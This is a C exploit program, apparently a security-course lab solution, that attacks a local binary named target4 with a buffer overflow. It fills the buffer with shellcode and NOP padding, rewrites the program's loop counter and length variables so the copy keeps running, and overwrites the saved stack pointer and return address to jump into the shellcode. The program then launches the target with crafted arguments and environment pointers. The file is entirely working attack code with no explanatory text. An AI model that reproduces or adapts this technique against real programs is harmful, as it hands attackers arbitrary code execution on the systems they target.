#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
int rip_addr = 0x2021fea8;
int rsp1_addr = 0x2021fe90;
int rsp2_addr = 0x2021fea0;
int buf_addr = 0x2021fdf0;
int i_addr = 0x2021fe98;
int len_addr = 0x2021fe9c;
char rsp_addr_str[] = "\xc0\xfe\x21\x20";
char buf_addr_str[] = "\xf0\xfd\x21\x20";

int main(void)
{
    char *args[3];
    char *env[14];

    args[0] = TARGET;
    int str_len = rip_addr + 4 - buf_addr;
    char exploit_str[str_len];
    memset(exploit_str, 0, str_len);
    strcpy(exploit_str, shellcode);
    int pos = strlen(shellcode);
    while(pos < i_addr - buf_addr) {
        strcat(exploit_str, NOP);
        ++pos;
    }

    // overwrite i back to 150
    int i_pos = i_addr - buf_addr;
    exploit_str[i_pos] = '\x96';

    // keep len as 169
    int len_pos = len_addr - buf_addr;
    exploit_str[len_pos] = '\xa9';

    int rsp2_pos = rsp2_addr - buf_addr;
    strcpy(exploit_str + rsp2_pos, rsp_addr_str);

    int rip_pos = rip_addr - buf_addr;
    strcpy(exploit_str + rip_pos, buf_addr_str);

    args[1] = exploit_str;
    args[2] = NULL;
    for(int i = 0; i <= 1; ++i) env[i] = "\0";
    env[2] = &exploit_str[len_pos];
    for(int i = 3; i <= 12; ++i) env[i] = "\0";
    env[13] = &exploit_str[rip_pos];

    if (0 > execve(TARGET, args, env))
      fprintf(stderr, "execve failed.\n");

    return 0;
}
